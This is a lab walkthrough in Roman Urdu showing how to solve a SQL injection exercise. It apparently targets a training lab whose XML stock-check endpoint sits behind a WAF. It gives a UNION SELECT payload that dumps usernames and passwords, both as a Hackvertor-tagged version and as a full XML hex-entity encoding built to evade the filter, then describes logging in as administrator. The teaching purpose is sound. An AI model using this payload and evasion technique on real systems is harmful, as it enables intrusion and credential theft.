
Is lab mein stock check request **XML format** mein jati hai. Target par **WAF (Firewall)** laga hua hai jo UNION SELECT wale normal text ko dekhte hi request block kar deta hai. Is liye hum poori injection payload ko **XML Entity Encoding (Hex Entities)** mein convert karke WAF bypass karenge.
Is lab ko solve karne ke 2 tareeqay hain:
### Method 1: Burp Suite (With Hackvertor Extension)
**1. Request Intercept & Analyze:**
 * Lab par ja kar kisi product ka **Check stock** button press karein.
 * Burp Repeater mein POST /product/stock request dekhein:
   ```xml
   <stockCheck>
       <productId>1</productId>
       <storeId>1</storeId>
   </stockCheck>
   
   ```
**2. WAF Test:**
 * If aap <storeId>1 UNION SELECT NULL</storeId> bhejein ge toh server **403 Forbidden** ya WAF Block message dega.
**3. Hackvertor Se Encoding Bypass:**
 * Burp BApp Store se **Hackvertor** extension install karein.
 * storeId ke andar poora payload likhein:
   ```text
   1 UNION SELECT username || '~' || password FROM users
   
   ```
 * Is poore text ko highlight karein \rightarrow Right-click \rightarrow **Extensions** \rightarrow **Hackvertor** \rightarrow **Encode** \rightarrow **hex_entities** par click karein.
 * Tag ke sath payload aisi dikhe gi:
   ```xml
   <storeId><@hex_entities>1 UNION SELECT username || '~' || password FROM users</@hex_entities></storeId>
   
   ```
 * Request send karein! WAF bypass ho jayega aur response mein administrator~password123 jaisi credentials dikh jayein gi.
### Method 2: Python Script / Manual Conversion (Bina Extension Ke)
Agar Hackvertor extension use nahi karni, toh aap har character ko manually XML Hex Entity (&#xHEX;) mein badal sakte hain.
**Payload Raw Text:**
```sql
1 UNION SELECT username || '~' || password FROM users

```
**XML Hex Encoded Version:**
```xml
<storeId>&#x31;&#x20;&#x55;&#x4e;&#x49;&#x4f;&#x4e;&#x20;&#x53;&#x45;&#x4c;&#x45;&#x43;&#x54;&#x20;&#x75;&#x73;&#x65;&#x72;&#x6e;&#x61;&#x6d;&#x65;&#x20;&#x7c;&#x7c;&#x20;&#x27;&#x7e;&#x27;&#x20;&#x7c;&#x7c;&#x20;&#x70;&#x61;&#x73;&#x73;&#x77;&#x6f;&#x72;&#x64;&#x20;&#x46;&#x52;&#x4f;&#x4d;&#x20;&#x75;&#x73;&#x65;&#x72;&#x73;</storeId>

```
**Execution Steps:**
 1. Is Encoded text ko copy karke <storeId> ke andar daalein.
 2. Request send karein. Server response mein units stock count ke sath administrator ka username aur password administrator~[password] text formatted mein show ho jayega.
 3. Lab ke **My account** page par ja kar administrator user aur copy kiye gaye password se login kar lein, lab solved ho jaye gi!
